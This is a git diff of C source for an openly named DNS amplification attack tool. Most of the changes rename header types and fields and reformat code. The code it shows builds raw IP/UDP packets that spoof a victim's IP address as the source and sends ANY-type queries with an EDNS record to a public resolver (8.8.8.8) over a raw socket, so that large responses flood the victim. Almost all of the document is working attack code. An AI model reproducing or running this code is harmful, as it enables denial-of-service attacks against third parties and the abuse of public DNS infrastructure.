@@ -25,34 +25,32 @@ unsigned short checkSum(unsigned short *ptr, int numBytes)
 	return(answer);
 }
 
-void querySiteFormat(unsigned char * dns,unsigned char * host) 
+void querySiteFormat(unsigned char * dns, unsigned char * host) 
 {
-	int lock = 0 , i;
-	strcat((char*)host,".");
-	for(i = 0 ; i < strlen((char*)host) ; i++) 
-	{
-		if(host[i]=='.') 
-		{
-			*dns++ = i-lock;
-			for(;lock<i;lock++) 
-			{
-				*dns++=host[lock];
-			}
-			lock++;
+	int last_dot = 0 , i;
+	strcat((char*)host, ".");
+
+	for (i = 0 ; i < strlen((char*)host) ; i++) {
+		if (host[i] == '.') {
+			*dns++ = i - last_dot;
+
+			for(; last_dot<i; last_dot++) *dns++ = host[last_dot];
+
+			last_dot++;
 		}
 	}
-	*dns++=0x00;
+
+	*dns++ = 0x00;
 }
 
-// Set the dns header and packet
 void setDnsHeader(dnsHeader *dns)
 {
 	dns->id = (unsigned short) htons(getpid());
 	dns->flags = htons(0x0120);
-	dns->qcount = htons(1);
-	dns->ans = 0;
-	dns->auth = 0;
-	dns->add = htons(1);
+	dns->qusCount = htons(1);
+	dns->ansCount = 0;
+	dns->authCount = 0;
+	dns->addRecordCount = htons(1);
 }
 
 void setExtendDnsHeader(eDnsHeader *eDns){
@@ -65,7 +63,7 @@ void setExtendDnsHeader(eDnsHeader *eDns){
 	eDns->dataLength = 0;
 }
 
-void setipHeader(iph *ip){
+void setipHeader(ipHeader *ip){
 	ip->version = 4;
     ip->ihl = 5;
     ip->tos = 0;
@@ -78,7 +76,7 @@ void setipHeader(iph *ip){
 }
 
 void setQuery(query *q){
-	q->qtype = htons(0x00ff);
+	q->type = htons(0x00ff);
 	q->qclass = htons(0x1);
 }
 
@@ -86,7 +84,9 @@ void dnsAmplificationAttack(char *victimIp, int victimPort)
 {
 	char *dnsIp = "8.8.8.8";
 	int dnsPort = 53;
-		
+	
+
+	/* Set headers */
 	unsigned char dnsRequestPacket[139];
 	unsigned char *dnsRecord = "www.github.com";
 	
@@ -119,20 +119,21 @@ void dnsAmplificationAttack(char *victimIp, int victimPort)
     sin.sin_port = htons(dnsPort);
     sin.sin_addr.s_addr = inet_addr(dnsIp);
     
-    iph *ip = (iph *)datagram;
+    ipHeader *ip = (ipHeader *)datagram;
     setipHeader(ip);
     ip->tot_len = 55 + (strlen(dnsName)+1);
     ip->saddr = inet_addr(victimIp);
 	ip->check = checkSum((unsigned short *)datagram, ip->tot_len);
 	ip->daddr = sin.sin_addr.s_addr;
 	
-    udph *udp = (udph *)(datagram + 20);
+    udpHeader *udp = (udpHeader *)(datagram + 20);
 	udp->source = htons(victimPort);
     udp->dest = htons(dnsPort);
     udp->len = htons(35 + (strlen(dnsName)+1));
     udp->check = 0;
-	
 
+
+    /* check sum */
 	psHeader pshdr;
 	pshdr.saddr = inet_addr(victimIp);
     pshdr.daddr = sin.sin_addr.s_addr;
@@ -148,6 +149,8 @@ void dnsAmplificationAttack(char *victimIp, int victimPort)
 		
     udp->check = checkSum((unsigned short *)psgram, pssize);
     
+
+    /* Set socket and send query packet */
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if(sock == -1) printf("Could not create socket.\n");
     else sendto(sock, datagram, ip->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
